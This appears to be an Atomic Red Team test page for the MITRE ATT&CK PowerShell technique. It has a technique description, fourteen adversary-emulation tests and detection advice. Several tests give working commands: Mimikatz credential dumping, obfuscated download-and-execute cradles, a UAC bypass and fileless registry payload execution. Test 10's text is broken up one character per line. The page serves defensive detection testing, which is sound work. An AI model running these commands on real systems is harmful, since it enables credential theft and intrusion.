# T1059.001 - Command and Scripting Interpreter: PowerShell
Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Mimikatz
Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
```

Invoke-AtomicTest T1059.001 -TestNumbers 1

### Atomic Test #2 - Run BloodHound from local disk
Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
import-module #{file_path}\SharpHound.ps1
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```

Invoke-AtomicTest T1059.001 -TestNumbers 2

### Atomic Test #3 - Run Bloodhound from Memory using Download Cradle
Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.

Successful execution will produce stdout message stating "SharpHound Enumeration Completed". Upon completion, final output will be a *BloodHound.zip file.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5
```

Invoke-AtomicTest T1059.001 -TestNumbers 3

### Atomic Test #4 - Obfuscation Tests
Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
```

Invoke-AtomicTest T1059.001 -TestNumbers 4

### Atomic Test #5 - Mimikatz - Cradlecraft PsSendKeys
Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
```

Invoke-AtomicTest T1059.001 -TestNumbers 5

### Atomic Test #6 - Invoke-AppPathBypass
Note: Windows 10 only. Upon execution windows backup and restore window will be opened.

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
```

Invoke-AtomicTest T1059.001 -TestNumbers 6

### Atomic Test #7 - Powershell MsXml COM object - with prompt
Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.

Provided by https://github.com/mgreen27/mgreen27.github.io

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

Invoke-AtomicTest T1059.001 -TestNumbers 7

### Atomic Test #8 - Powershell XML requests
Powershell xml download request. Upon execution, "Download Cradle test success!" will be dispalyed.

Provided by https://github.com/mgreen27/mgreen27.github.io

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
```

Invoke-AtomicTest T1059.001 -TestNumbers 8

### Atomic Test #9 - Powershell invoke mshta.exe download
Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".

Provided by https://github.com/mgreen27/mgreen27.github.io

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
```

Invoke-AtomicTest T1059.001 -TestNumbers 9

### Atomic Test #10 - Powershell Invoke-DownloadCradle
Provided by https://github.com/mgreen27/mgreen27.github.io
Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.

**Supported Platforms:** windows
Run it with these steps!
1
.
 
O
p
e
n
 
P
o
w
e
r
s
h
e
l
l
_
i
s
e
 
a
s
 
a
 
P
r
i
v
i
l
e
g
e
d
 
A
c
c
o
u
n
t


2
.
 
I
n
v
o
k
e
-
D
o
w
n
l
o
a
d
C
r
a
d
l
e
.
p
s
1



### Atomic Test #11 - PowerShell Fileless Script Execution
Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open "C:\Windows\Temp" and verify that
art-marker.txt is in the folder.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
# Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
```

Invoke-AtomicTest T1059.001 -TestNumbers 11

### Atomic Test #12 - PowerShell Downgrade Attack
This test requires the manual installation of PowerShell V2.

Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
powershell.exe -version 2 -Command Write-Host $PSVersion
```

Invoke-AtomicTest T1059.001 -TestNumbers 12

### Atomic Test #13 - NTFS Alternate Data Stream Access
Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, "Stream Data Executed" will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
Invoke-Expression $streamcommand
```

Invoke-AtomicTest T1059.001 -TestNumbers 13

### Atomic Test #14 - PowerShell Session Creation and Use
Connect to a remote powershell session and interact with the host.
Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
New-PSSession -ComputerName #{hostname_to_connect}
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
```

Invoke-AtomicTest T1059.001 -TestNumbers 14

## Detection
If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.